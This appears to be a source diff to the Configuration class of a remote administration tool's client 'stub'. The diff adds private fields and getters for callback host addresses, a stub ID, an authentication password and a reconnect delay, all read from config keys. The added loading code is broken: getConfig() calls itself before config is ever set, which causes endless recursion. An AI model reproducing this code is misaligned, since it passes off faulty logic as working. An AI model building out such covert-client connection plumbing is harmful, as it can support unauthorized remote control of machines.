@@ -34,10 +34,46 @@ public class Configuration {
 	 * Installation date in Unix time (process launch time if no date available)
 	 */
 	private static long installms;
+	
+
+	/**
+	 * Hosts to connect to in format ip:port
+	 */
+	private static String[] addresses;
+	
+	/**
+	 * ID string of this stub
+	 */
+	private static String id;
+	
+	/**
+	 * Authentication password
+	 */
+	private static String pass;
+	
+	/**
+	 * Delay between each connection attempt in seconds
+	 */
+	private static long connectionDelay;
+
 
 	public static Map<String, String> getConfig() throws Exception {
 		if (config != null) {
 			return config;
+		}
+		
+		addresses = getConfig().get("addresses").split(",");
+		id = getConfig().get("id");
+		pass = getConfig().get("pass");
+		connectionDelay = Long.parseLong(getConfig().get("reconsec"));
+		name = getConfig().get("name");
+		errorLogging = Boolean.parseBoolean(getConfig().get("error"));
+		debugMessages = Boolean.parseBoolean(getConfig().get("debugmsg"));
+
+		if (Boolean.parseBoolean(getConfig().get("timeout"))) {
+			timeout = Integer.parseInt(getConfig().get("toms"));
+		} else {
+			timeout = 1000 * 15;
 		}
 		
 		key = new byte[Crypto.KEY_LENGTH];
@@ -122,10 +158,6 @@ public class Configuration {
 		}
 	}
 
-	public static String[] addresses;
-	public static String id;
-	public static String pass;
-	public static long reconnectSeconds;
 	public static String name;
 	public static boolean running = true;
 	public static String date;
@@ -133,5 +165,21 @@ public class Configuration {
 	public static boolean errorLogging = false;
 	public static boolean debugMessages = true;
 	public static TrayIcon icon;
+
+	public static String[] getAddresses() {
+		return addresses;
+	}
+
+	public static String getID() {
+		return id;
+	}
+
+	public static String getPass() {
+		return pass;
+	}
+	
+	public static long getConnectionDelay() {
+		return connectionDelay;
+	}
 
 }
